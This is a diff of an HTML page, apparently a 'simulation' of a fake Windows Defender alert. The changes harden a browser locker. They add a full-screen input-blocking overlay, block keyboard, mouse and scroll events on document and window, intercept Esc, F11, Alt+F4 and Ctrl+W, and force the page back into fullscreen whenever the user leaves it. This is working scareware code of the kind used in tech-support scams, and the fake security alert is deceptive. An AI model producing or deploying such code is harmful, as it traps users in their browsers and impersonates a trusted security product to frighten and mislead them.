@@ -238,14 +238,14 @@
             margin-top: 30px;
         }
         
-        #blocker {
+        #inputBlocker {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
             z-index: 9999;
-            display: none;
+            background: transparent;
         }
     </style>
 </head>
@@ -340,28 +340,42 @@
     </div>
     
     <!-- Input blocker (transparent overlay) -->
-    <div id="blocker"></div>
+    <div id="inputBlocker"></div>
     
     <script>
-        // Strict input blocking
+        // Strict input blocking function
         function blockAllInput(e) {
             e.preventDefault();
             e.stopPropagation();
             e.stopImmediatePropagation();
             return false;
         }
-        
+
         // Block all possible input methods
-        document.addEventListener('keydown', blockAllInput, true);
-        document.addEventListener('keyup', blockAllInput, true);
-        document.addEventListener('keypress', blockAllInput, true);
-        document.addEventListener('contextmenu', blockAllInput, true);
-        document.addEventListener('selectstart', blockAllInput, true);
-        document.addEventListener('dragstart', blockAllInput, true);
-        document.addEventListener('mousedown', blockAllInput, true);
-        document.addEventListener('mouseup', blockAllInput, true);
-        document.addEventListener('click', blockAllInput, true);
-        
+        const eventsToBlock = [
+            'keydown', 'keyup', 'keypress',
+            'contextmenu', 'selectstart', 'dragstart',
+            'mousedown', 'mouseup', 'click',
+            'wheel', 'mousewheel', 'DOMMouseScroll'
+        ];
+
+        eventsToBlock.forEach(event => {
+            document.addEventListener(event, blockAllInput, {capture: true, passive: false});
+            window.addEventListener(event, blockAllInput, {capture: true, passive: false});
+        });
+
+        // Block F11, Esc, Alt+F4, etc.
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'F11' || e.key === 'Escape' || 
+                (e.altKey && e.key === 'F4') || 
+                (e.ctrlKey && (e.key === 'w' || e.key === 'W'))) {
+                e.preventDefault();
+                e.stopPropagation();
+                e.stopImmediatePropagation();
+                return false;
+            }
+        }, true);
+
         // Auto-start countdown
         let count = 5;
         const countdownElement = document.getElementById('countdown');
@@ -377,7 +391,7 @@
         
         function startSimulation() {
             // Activate input blocker
-            document.getElementById('blocker').style.display = 'block';
+            document.getElementById('inputBlocker').style.display = 'block';
             
             // Hide normal content
             document.getElementById('normalContent').style.display = 'none';
@@ -385,15 +399,24 @@
             // Show Defender alert
             document.getElementById('defenderScreen').style.display = 'flex';
             
-            // Force fullscreen
+            // Force fullscreen with retry logic
             const enterFullscreen = () => {
-                if (document.documentElement.requestFullscreen) {
-                    document.documentElement.requestFullscreen()
+                const elem = document.documentElement;
+                
+                if (elem.requestFullscreen) {
+                    elem.requestFullscreen()
                         .then(() => {
                             // Lock orientation if supported
                             if (screen.orientation && screen.orientation.lock) {
                                 screen.orientation.lock('landscape').catch(() => {});
                             }
+                            
+                            // Prevent exiting fullscreen
+                            document.addEventListener('fullscreenchange', () => {
+                                if (!document.fullscreenElement) {
+                                    enterFullscreen();
+                                }
+                            });
                         })
                         .catch(err => {
                             console.log("Fullscreen error:", err);
@@ -404,13 +427,6 @@
             };
             
             enterFullscreen();
-            
-            // Prevent exiting fullscreen
-            document.addEventListener('fullscreenchange', () => {
-                if (!document.fullscreenElement) {
-                    enterFullscreen();
-                }
-            });
         }
         
         // Defender "Remove Threat" button
